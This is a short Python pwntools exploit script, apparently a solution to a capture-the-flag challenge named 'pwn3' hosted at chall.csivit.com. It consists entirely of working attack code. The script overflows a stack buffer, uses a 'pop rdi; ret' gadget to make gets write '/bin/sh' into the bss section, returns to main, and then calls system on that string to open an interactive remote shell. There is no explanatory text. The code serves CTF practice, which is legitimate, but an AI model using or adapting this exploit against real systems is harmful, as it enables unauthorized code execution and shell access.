#!/usr/bin/python3

from pwn import *

#p = process("./pwn3")
p = remote("chall.csivit.com", 30013)
elf = ELF("./pwn3")
offset = 32 + 8
rop = ROP("./pwn3")

PopRdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bss = 0x4040a0

log.info("Pop rdi; ret @ 0x%x" , PopRdi)
payload = b"M"*offset + p64(PopRdi) +p64(bss) +p64(elf.plt["gets"]) + p64(elf.sym["main"])

p.recvline()
p.sendline(payload)
p.sendline("/bin/sh\0")

p.recvline()
payload2 = b"M"*offset + p64(PopRdi) + p64(bss) + p64(elf.plt["system"])
p.sendline(payload2)
p.interactive()


